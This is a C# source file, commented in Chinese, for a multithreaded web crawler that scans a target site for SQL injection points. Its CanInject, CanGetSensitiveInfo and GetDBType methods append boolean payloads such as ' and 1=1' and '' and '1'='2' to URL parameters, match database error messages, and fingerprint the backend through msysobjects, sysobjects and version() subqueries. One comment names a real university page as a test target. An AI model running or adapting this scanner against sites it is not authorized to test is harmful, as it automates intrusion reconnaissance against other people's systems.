using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.Text.RegularExpressions; 
using System.Net; 
using System.IO;
using mshtml;
using System.Threading;

namespace Php
{
    class Http
    {
        //---------类相关的变量-------------------------------------------------
        public String RootUrl;//要接受扫描的网站的首页url
        public IPAddress[] ipList;
        public String HtmlCode;//首页返回的htmlcode
        public Boolean IsInjectable = false;//该网站是否存在sql注入漏洞
        public Boolean IsSensitive = false;//该网站是否泄漏敏感信息
        public String WebLanguage;//该网站的开发语言 asp php aspx jsp
        public String DBType="";//数据库类型 Access、SQLserver、MySQL
        public String Info="";//站点说明
        public int SecurityLevel = -1;//站点的安全等级
        /*
            0级：网页无法打开，链接出错
            1级：没有发现任何安全隐漏报患的网站为最高安全级别
            2级：注入测试失败，但是网站没有进行容错处理，在错误报告中存在泄漏敏感信息的安全隐患
            3级：存在注入漏洞，但是网站有容错处理，不会泄漏敏感信息
            4级：存在注入漏洞，且存在敏感信息泄漏洞额问题，网站几乎没有考虑过任何安全问题，非常容易被渗透入侵
        */
        //public String DBVersion;//数据库版本
        public int N_Pages = 0;//扫描的页面总数
        public int N_Pages_secure = 0;//安全页面数
        public int N_Pages_sensitive = 0;//泄漏敏感信息的页面数
        public int N_Pages_injectable = 0;//可以注入的页面数
        public ArrayList alPossibleInjectionPoints=new ArrayList();//可能的注入点
        public ArrayList alSensitivePoints = new ArrayList();//泄漏敏感信息的注入点
        public ArrayList alInjectionPoints = new ArrayList();//确实可以注入的注入点
        public String FirstInjectionPoint="";
        //---------线程通信相关的变量-------------------------------------------------
        public String url;//要扫描的url,主线程与子线程的传递参数
        public ArrayList altmpIPs = new ArrayList();//装临时的可能的注入点
        public Boolean locked_alPIP = false;
        //public int num = 0;//某一个层线程共扫描出的可能注入点的总个数
        //---------线程相关的变量-------------------------------------------------
        public static int t_num = 100;
        public Thread[] t = new Thread[t_num];
        public int n = 0;//表示当前内部线程个数        
        //---------性能相关的变量-------------------------------------------------
        public int[] floor_threads_num = new int[128];
        public int floor = 0;

        public float FError = new float();

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Http类的构造函数
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Http(String rooturl)
        {
            this.RootUrl = rooturl;
        }
        public Http(String rooturl,String info)
        {
            this.RootUrl = rooturl;
            this.Info = info;
        }
        public Http()
        { 
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //对一个网站进行扫描,主控程序
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void Scan()
        {
            try
            {
                this.ipList = System.Net.Dns.GetHostEntry(new Uri(this.RootUrl).Host).AddressList;
            }
            catch (Exception e)
            {
                e.GetType();
                this.SecurityLevel = 0;
                return;
            }
            //向主页发出http请求
            this.HtmlCode = GetResponseHtmlCode(RootUrl, "GET");
            if (this.HtmlCode.Contains("无法解析此远程名称"))
            {
                this.SecurityLevel = 0;
                return;
            }
            //分析该网站的开发语言 asp php aspx jsp
            string strASP = @"\.asp\?";
            string strASPX = @"\.aspx\?";
            string strJSP = @"\.jsp\?";
            string strPHP = @"\.php\?";
            this.WebLanguage = "asp";
            Regex rASP = new Regex(strASP, RegexOptions.IgnoreCase);
            Regex rASPX = new Regex(strASPX, RegexOptions.IgnoreCase);
            Regex rJSP = new Regex(strJSP, RegexOptions.IgnoreCase);
            Regex rPHP = new Regex(strPHP, RegexOptions.IgnoreCase);
            MatchCollection mASP = rASP.Matches(HtmlCode);
            MatchCollection mASPX = rASPX.Matches(HtmlCode);
            MatchCollection mJSP = rJSP.Matches(HtmlCode);
            MatchCollection mPHP = rPHP.Matches(HtmlCode);
            int max = mASP.Count;
            if (mASPX.Count >= max)
            {
                this.WebLanguage = "aspx";
                max = mASPX.Count;
            }
            if (mJSP.Count > max)
            {
                this.WebLanguage = "jsp";
                max = mJSP.Count;
            }
            if (mPHP.Count > max)
            {
                this.WebLanguage = "php";
                max = mPHP.Count;
            }
            InjectionPoint IPnew = new InjectionPoint(RootUrl, false, false, false);
            alPossibleInjectionPoints.Add(IPnew); 
            //从主页中寻找可能的SQL注入点,并放入alPossibleInjectionPoints中
            FindPossibleInjectionPoints(HtmlCode, new Uri(RootUrl), alPossibleInjectionPoints);
            if (alPossibleInjectionPoints.Count == 0)
            {
                floor_threads_num[floor] = -1;//扫描终止标志
                return;
            }
            else
            {
                floor_threads_num[floor++] = alPossibleInjectionPoints.Count;//第一轮需要扫描页面个数
                floor_threads_num[floor] = 0;
                SubScan();
            }
        }
        //递归调用，每次调用表示一轮扫描（广度优先扫描）
        public void SubScan()
        { 
            altmpIPs.Clear();
            lock (alPossibleInjectionPoints.SyncRoot)
            {
                foreach (InjectionPoint IP in alPossibleInjectionPoints)
                {
                    //如果这个注入点已经被扫描过了 那么bye bye！
                    if (IP.Isdealed)
                        continue;
                    IP.Isdealed = true;
                    //检测可否注入
                    if (CanInject(IP.Url))
                    {
                        //这个可能的注入点可以注入
                        IP.CanInject = true;
                        this.N_Pages_injectable++;
                        this.IsInjectable = true;
                    }
                    //检测可否获取敏感信息
                    if (CanGetSensitiveInfo(IP.Url))
                    {
                        IP.IsSensitive = true;
                        this.IsSensitive = true;
                        this.N_Pages_sensitive++;
                    }
                    //由于可以注入，现在开始检测该网站的数据库类型
                    //第一次发现注入点的时候开始检测，只检测这一次！  
                    if (this.FirstInjectionPoint == "" && IP.Url.IndexOf('%') == -1 && IP.IsSensitive == true)
                    {
                        this.FirstInjectionPoint = IP.Url;
                        this.DBType = this.GetDBType(this.FirstInjectionPoint);
                    }
                    if (this.DBType == "" && IP.Url.IndexOf('%') == -1 && IP.CanInject == true)
                    {
                        this.FirstInjectionPoint = IP.Url;
                        this.DBType = this.GetDBType(this.FirstInjectionPoint);
                    }
                    if (IP.IsSensitive | IP.CanInject)
                        this.N_Pages_secure++;
                    //触发多线程，进行下一轮扫描
                    this.url = IP.Url;
                    t[n % t_num] = new Thread(new ThreadStart(ThreadProc));
                    t[n % t_num].Start();
                    Thread.Sleep(300);//等待新创建的线程把n读过去，然后主线程n再加1
                    n++;
                }

                //等待发出的(n > 100) ? 100 : n个线程是否返回 
                for (int i = 0; i < ((n > t_num) ? t_num : n); i++)
                {
                    if (t[i] != null)
                        t[i].Join();
                }
                //如果在新的页面中还有可能的注入点
                if (altmpIPs.Count > 0)
                {
                    //检查新找出的可能的注入点时候与先前的可能注入点集合中的某个相同
                    foreach (InjectionPoint IPnew in altmpIPs)
                    {
                        bool rep = false;
                        foreach (InjectionPoint IP in alPossibleInjectionPoints)
                        {
                            int end1 = 0, end2 = 0;
                            if (IPnew.Url.IndexOf('?') == -1)
                                end1 = IPnew.Url.Length;
                            else
                                end1 = IPnew.Url.IndexOf('?');
                            if (IP.Url.IndexOf('?') == -1)
                                end2 = IP.Url.Length;
                            else
                                end2 = IP.Url.IndexOf('?');
                            if ((IPnew.Url.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && IPnew.Url.IndexOf('?') != -1))
                            {
                                //xxx.asp
                                //xxx.asp?id=123
                                //加
                                rep = false;
                            }
                            if ((IPnew.Url.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') != -1))
                            {
                                //xxx.asp?id=123
                                //xxx.asp 或 xxx.asp?id=456
                                //不加
                                rep = true;
                                break;
                            }
                            if ((IPnew.Url.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && IPnew.Url.IndexOf('?') == -1))
                            {
                                //xxx.asp
                                //xxx.asp
                                //不加
                                rep = true;
                                break;
                            }
                        }
                        if (!rep)
                        {
                            if (IPnew.Url.StartsWith(RootUrl))
                            {
                                //把这个新的url加入到alPossibleInjectionPoints中,并标记为"尚未处理"和"未知是否可注入" 
                                while (locked_alPIP) ;
                                if (!locked_alPIP)
                                {
                                    locked_alPIP = true;
                                    alPossibleInjectionPoints.Add(IPnew);
                                    locked_alPIP = false;
                                    floor_threads_num[floor] += 1;
                                    break;
                                }
                            }
                            else
                            {
                                foreach (IPAddress ip in ipList)
                                {
                                    if (IPnew.Url.StartsWith("http://" + ip.ToString()))
                                    {
                                        while (locked_alPIP) ;
                                        if (!locked_alPIP)
                                        {
                                            locked_alPIP = true;
                                            alPossibleInjectionPoints.Add(IPnew);
                                            locked_alPIP = false;
                                            floor_threads_num[floor] += 1;
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    altmpIPs.Clear();
                    if (floor_threads_num[floor] > 0)
                    {
                        floor_threads_num[++floor] = 0;
                        for (int i = 0; i < ((n > t_num) ? t_num : n); i++)
                        {
                            if (t[i] != null)
                                t[i].Abort();
                        }
                        n = 0;
                        SubScan();
                    }
                }
                else
                {
                    //标识扫描结束
                    floor_threads_num[floor] = -1;
                }
            }
        }
        //多线程执行的函数
        public void ThreadProc()
        {
            //int num_t = this.num;
            String url_t = this.url;
            //ArrayList altmpIPs_t = altmpIPs;

            FindPossibleInjectionPoints(GetResponseHtmlCode(url_t, "POST"), new Uri(url_t), altmpIPs);
            //FindPossibleInjectionPoints(GetResponseHtmlCode(url_t, "POST"), new Uri(url_t), altmpIPs_t);
            
            //this.num+=num_t;
            //this.altmpIPs = altmpIPs_t;            
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //向给定的url发出http请求,接受返回的html
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public string GetResponseHtmlCode(string url,string method)
        {


            string re = "";
            try
            {
                //创建一个http请求
                WebRequest wr = WebRequest.Create(url);
                wr.Method = method;
                wr.ContentType = "application/x-www-form-urlencoded";
                wr.ContentLength = 0;

                WebResponse result = wr.GetResponse();
                Stream ReceiveStream = result.GetResponseStream();

                Byte[] read = new Byte[512];
                int bytes = ReceiveStream.Read(read, 0, 512);

                re = "";
                while (bytes > 0)
                {

                    // 注意：
                    // 下面假定响应使用 UTF-8 作为编码方式。
                    // 如果内容以 ANSI 代码页形式（例如，932）发送，则使用类似下面的语句：
                    //  Encoding encode = System.Text.Encoding.GetEncoding("shift-jis");
                    Encoding encode = System.Text.Encoding.GetEncoding("gb2312");
                    re += encode.GetString(read, 0, bytes);
                    bytes = ReceiveStream.Read(read, 0, 512);
                }
            }
            catch (Exception e)
            {
                re = e.Message;
            }
            return re;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //根据返回的htmlcode寻找可能的注入点,并把这些可能的注入点加入到alPossibleInjectionPoints中
        //提取htmlcode中的链接(绝对路径)
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void FindPossibleInjectionPoints(string htmlCode, Uri relativeLocation,ArrayList aldestIPs)
        { 
            //www.abc.com/ def/ghi/ jkl.asp?id=23  
            //www.abc.com/ def/ghi/ jkl?id=23 
            //string strRegex = @"(http://([A-Za-z0-9_.]+/))?([(\w*/)|(\./)|(\.\./)])*(\w+\.((asp)|(php)|(jsp)|(aspx))(\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)))";
            //string strRegex = @"(http://([A-Za-z0-9_.]+/))?([(\w*/)|(\./)|(\.\./)])*(\w+\.((asp)|(php)|(jsp)|(aspx))(\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)(&)?)*)";
            //string strRegex = @"(http://([A-Za-z0-9_.:]+/))?(/)?([(\w*/)|(\./)|(\.\./)])*(\w+(\.((aspx)|(php)|(jsp)|(asp)))?(\?(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)(&)?)+)?)";
            //string strRegex = @"(http://([A-Za-z0-9_.:]+/))?([(\w*/)|(\./)|(\.\./)])*(\w+((\.aspx)|(\.php)|(\.jsp)|(\.asp)|(\?(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+))))((\?)(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)&?)+)?)";
            string strRegex = @"(http://([A-Za-z0-9_.:]+/))?([(\w*/)|(\./)|(\.\./)])*((\w+((\.aspx)|(\.php)|(\.jsp)|(\.asp))((\?)(\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)&?)+)?)|(\w+\?((\w+=([A-Za-z0-9\u0391-\uFFE5_.]+)&?)+)))";

            Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(htmlCode);
            
            for (int i = 0; i <= m.Count - 1; i++)
            {
                bool rep = false;
                string strNew = m[i].ToString();
                //改绝对路径方式的url
                Uri urlNew = new Uri(relativeLocation, strNew);
                strNew = urlNew.AbsoluteUri.ToString();

                // 过滤重复的URL,并且不能出站(2个条件) 
                //ArrayList al = new ArrayList();
                //al = aldestIPs; 
                lock (aldestIPs.SyncRoot)
                {
                    foreach (InjectionPoint IP in aldestIPs)
                    {
                        int end1 = 0, end2 = 0;
                        if (strNew.IndexOf('?') == -1)
                            end1 = strNew.Length;
                        else
                            end1 = strNew.IndexOf('?');
                        if (IP.Url.IndexOf('?') == -1)
                            end2 = IP.Url.Length;
                        else
                            end2 = IP.Url.IndexOf('?');
                        if ((strNew.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && strNew.IndexOf('?') != -1))
                        {
                            //xxx.asp
                            //xxx.asp?id=123
                            //加
                            rep = false;
                        }
                        if ((strNew.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') != -1))
                        {
                            //xxx.asp?id=123
                            //xxx.asp 或 xxx.asp?id=456
                            //不加
                            rep = true;
                            break;
                        }
                        if ((strNew.Substring(0, end1) == IP.Url.Substring(0, end2)) && (IP.Url.IndexOf('?') == -1 && strNew.IndexOf('?') == -1))
                        {
                            //xxx.asp
                            //xxx.asp
                            //不加
                            rep = true;
                            break;
                        }
                    }
                    if (!rep)
                    {
                        //把这个新的url加入到alPossibleInjectionPoints中,并标记为"尚未处理"和"未知是否可注入"
                        if (strNew.StartsWith(RootUrl))
                        {
                            InjectionPoint IPnew = new InjectionPoint(strNew, false, false, false);
                            while (locked_alPIP) ;
                            if (!locked_alPIP)
                            {
                                locked_alPIP = true;
                                aldestIPs.Add(IPnew);
                                locked_alPIP = false;
                            }
                        }
                        else
                        {
                            foreach (IPAddress ip in ipList)
                            {
                                if (strNew.StartsWith("http://" + ip.ToString()))
                                {
                                    InjectionPoint IPnew = new InjectionPoint(strNew, false, false, false);
                                    while (locked_alPIP) ;
                                    if (!locked_alPIP)
                                    {
                                        locked_alPIP = true;
                                        aldestIPs.Add(IPnew);
                                        locked_alPIP = false;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            } 
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //检查某个可能的注入点InjectionPoint是否可以注入
        //请求url'        返回错误信息
        //请求url and 1=1 返回正常和请求url的返回一样
        //请求url and 1=2 返回没有结果
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean CanInject(String url)
        {
            FError = 0.0008F;
            Boolean canInject = false;
            if (url.IndexOf('?') != -1)
            {
                String HtmlCode_url = GetResponseHtmlCode(url, "POST");
                //------------------------------数字型------------------------------------------------
                String HtmlCode_url_with_11 = GetResponseHtmlCode(url + " and 1=1", "POST");
                String HtmlCode_url_with_12 = GetResponseHtmlCode(url + " and 1=2", "POST");
                //------------------------------字符型------------------------------------------------
                String HtmlCode_url_with_comma_11 = GetResponseHtmlCode(url + "' and '1'='1", "POST");
                String HtmlCode_url_with_comma_12 = GetResponseHtmlCode(url + "' and '1'='2", "POST");

                if (
                    IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_11, FError)//and 1=1 返回正常
                    && (
                        (HtmlCode_url_with_12 == null || HtmlCode_url_with_12.Trim() == "") //and 1=2 无返回
                        || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_12, FError)
                        )
                    )
                    return true;
                if (
                    IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_comma_11, FError)//and 1=1 返回正常
                    && (
                        (HtmlCode_url_with_comma_12 == null || HtmlCode_url_with_comma_12.Trim() == "") //and 1=2 无返回
                        || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_comma_12, FError)
                        )
                    )
                    return true;
            
                //--------------http://donate.xjtu.edu.cn/xqb/show.php?dbfile=text_file&id=38-------------------
                //--------------各个参数遍历测试--------------------------------------------------------------------
                //Uri Uri_test = new Uri(url);
                //String query=Uri_test.Query;
                int p_and=0; 
                int p_and1 = url.IndexOf('&', p_and);
                while (url.IndexOf('&', p_and) != -1)
                {
                    //------------------------------数字型------------------------------------------------
                    HtmlCode_url_with_11 = GetResponseHtmlCode(url.Substring(0,p_and1) + " and 1=1"+url.Substring(p_and1), "POST");
                    HtmlCode_url_with_12 = GetResponseHtmlCode(url.Substring(0,p_and1) + " and 1=2"+url.Substring(p_and1), "POST");
                    if (
                        IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_11, FError)//and 1=1 返回正常
                        && (
                            (HtmlCode_url_with_12 == null || HtmlCode_url_with_12.Trim() == "") //and 1=2 无返回
                            || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_12, FError)
                            )
                        )
                        return true;
                    //------------------------------字符型------------------------------------------------
                    HtmlCode_url_with_11 = GetResponseHtmlCode(url.Substring(0,p_and1) + "' and '1'='1"+url.Substring(p_and1), "POST");
                    HtmlCode_url_with_12 = GetResponseHtmlCode(url.Substring(0,p_and1) + "' and '1'='2"+url.Substring(p_and1), "POST");
                    if (
                        IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_11, FError)//and 1=1 返回正常
                        && (
                            (HtmlCode_url_with_12 == null || HtmlCode_url_with_12.Trim() == "") //and 1=2 无返回
                            || !IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_12, FError)
                            )
                        )
                        return true;
                    p_and = p_and1+1;
                }
            }

            return canInject;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //检查某个可能的注入点InjectionPoint是否泄漏敏感信息 
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean CanGetSensitiveInfo(String urlstr)
        {
            Boolean CanGetSensitive = false;
            String HtmlCode_url_with_comma = GetResponseHtmlCode(urlstr + "'", "POST");
            string strSensitiveCheck = @"(Database error)|(MySQL Error)|(Microsoft JET Database Engine)|(Microsoft JET)|(Microsoft OLE DB Provider for SQL Server)|(error in your SQL syntax)|(Apache Tomcat)|(SQLException)|(内部服务器错误)|(Warning)|(Source Error)|(Exception)";
            Regex r = new Regex(strSensitiveCheck, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(HtmlCode_url_with_comma); 
            if (m.Count > 0)
                CanGetSensitive = true;
            return CanGetSensitive;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //获取该网站的数据库类型 MySQL Acces SQLserver 未知
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public String GetDBType(String url)
        {
            float Ferr = new float();
            Ferr = 0.1F;
            String Type = "";
            string strDBCheck = "";
            Regex r = null;
            MatchCollection m = null; 
            String HtmlCode_url = GetResponseHtmlCode(url, "POST");
            String HtmlCode_url_with_comma = GetResponseHtmlCode(url + "'", "POST");
            String HtmlCode_url_with_msysobjects = GetResponseHtmlCode(url + " and (select count(*) from msysobjects)>0", "POST");
            ////////////////////////////
            strDBCheck = @"(Database error)|(MySQL Error)";
            r = new Regex(strDBCheck, RegexOptions.IgnoreCase);
            m = r.Matches(HtmlCode_url_with_comma);
            if (m.Count > 0)
            {
                Type = "MySQL";
                return Type;
            }
            strDBCheck = @"(Microsoft JET Database Engine)|(Microsoft JET)";
            r = new Regex(strDBCheck, RegexOptions.IgnoreCase);
            m = r.Matches(HtmlCode_url_with_comma);
            if (m.Count > 0)
            {
                Type = "Access";
                return Type;
            }
            strDBCheck = @"(Microsoft OLE DB Provider for SQL Server)|(语法错误)";
            r = new Regex(strDBCheck, RegexOptions.IgnoreCase);
            m = r.Matches(HtmlCode_url_with_comma);
            if (m.Count > 0)
            {
                Type = "SQLserver";
                return Type;
            }
            //////////////////////////////
            if (IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_msysobjects, Ferr))
            {
                Type = "Access";
                return Type;
            }
            String HtmlCode_url_with_sysobjects = GetResponseHtmlCode(url + " and (select count(*) from sysobjects)>0", "POST");
            if (IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_sysobjects, Ferr))
            {
                Type = "SQLserver";
                return Type;
            }
            String HtmlCode_url_with_ascii_version = GetResponseHtmlCode(url + " and ascii(version())>0", "POST");
            if (IsHtmlCodeSimilar(HtmlCode_url, HtmlCode_url_with_ascii_version, Ferr))
            {
                Type = "MySQL";
                return Type;
            }

            Type = "未知"; 
            return Type;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //两次返回的htmlcode的模糊匹配
        //目前的方法是：判断两个htmlcode的大小是否接近
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean IsHtmlCodeSimilar(String HtmlCode1,String HtmlCode2,float err)
        {
            Boolean IsSimilar = false;
            if (Math.Abs(((float)HtmlCode1.Length * 2 / (HtmlCode1.Length + HtmlCode2.Length)) - 1) < err)
                IsSimilar = true;
            return IsSimilar;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //两次返回的htmlcode的模糊匹配
        //目前的方法是：判断两个htmlcode的大小是否接近
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Boolean IsContentSimilar(String HtmlCode1, String HtmlCode2, float err)
        {
            HtmlCode1 = HtmlCode1.Trim();
            HtmlCode2 = HtmlCode2.Trim();
            Boolean IsSimilar = false;
            Boolean stop = false;
            int n_similar=0;
            while (!stop && n_similar < HtmlCode1.Length && n_similar < HtmlCode2.Length)
            {
                if (HtmlCode1.Substring(n_similar, 1) == HtmlCode2.Substring(n_similar, 1))
                    n_similar++;
                else
                    stop = true;
            }
            if (((float)n_similar * 2) / (HtmlCode1.Length + HtmlCode2.Length) > err)
                return true;
            return IsSimilar;
        }
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //未用  提取htmlcode中的链接
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public ArrayList GetHyperLinks1(string htmlCode)
        {
            ArrayList al = new ArrayList();
            //www.abc.com/ def/ghi/ jkl.asp?id=23 
            //string strRegex = @"\w+\.asp\?\w+=\w+";
            //string strRegex = @"\<a.*href\s*=\s*(?:""(?<url>[^""]*)""|'(?<url>[^']*)'|(?<url>[^\>^\s]+)).*\>(?<title>[^\<^\>]*)\<[^\</a\>]*/a\>"; 
            //string strRegex = @"(http://([A-Za-z0-9_.]+/))?([(\w+/)*|(\./)?|(\.\./)*])?(\w+\.((asp)|(php)|(jsp))\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+))";
            string strRegex = @"http://([A-Za-z0-9_.]+/)(\w+/)*(\w+\.((asp)|(php)|(jsp))\?\w+=([A-Za-z0-9\u0391-\uFFE5_.]+))";

            Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(htmlCode);

            for (int i = 0; i <= m.Count - 1; i++)
            {
                bool rep = false;
                string strNew = m[i].ToString();
                //Uri urlNew = new Uri(strNew);

                // 过滤重复的URL 
                foreach (string str in al)
                {
                    //Uri url = new url(str);
                    if (strNew == str || strNew.Substring(0, strNew.IndexOf('?')) == str.Substring(0, str.IndexOf('?')))
                    {
                        rep = true;
                        break;
                    }
                }
                if (!rep) al.Add(strNew);
            }
            al.Sort();
            return al;
        }
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        //未用  将相对路径链接方式的htmlcode转换为绝对路径的htmlcode
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public string ConvertToAbsoluteUrls(string html, Uri relativeLocation)
        {
            IHTMLDocument2 doc = new HTMLDocumentClass();
            doc.write(new object[] { html });
            doc.close();
 
            foreach (IHTMLAnchorElement anchor in doc.links)
            {
                IHTMLElement element = (IHTMLElement)anchor;
                string href = (string)element.getAttribute("href", 2);
                if (href != null)
                {
                    Uri addr = new Uri(relativeLocation, href);
                    anchor.href = addr.AbsoluteUri;
                }
            }

            foreach (IHTMLImgElement image in doc.images)
            {
                IHTMLElement element = (IHTMLElement)image;
                string src = (string)element.getAttribute("src", 2);
                if (src != null)
                {
                    Uri addr = new Uri(relativeLocation, src);
                    image.src = addr.AbsoluteUri;
                }
            }

            string ret = doc.body.innerHTML;

            return ret;
        }

    }
} 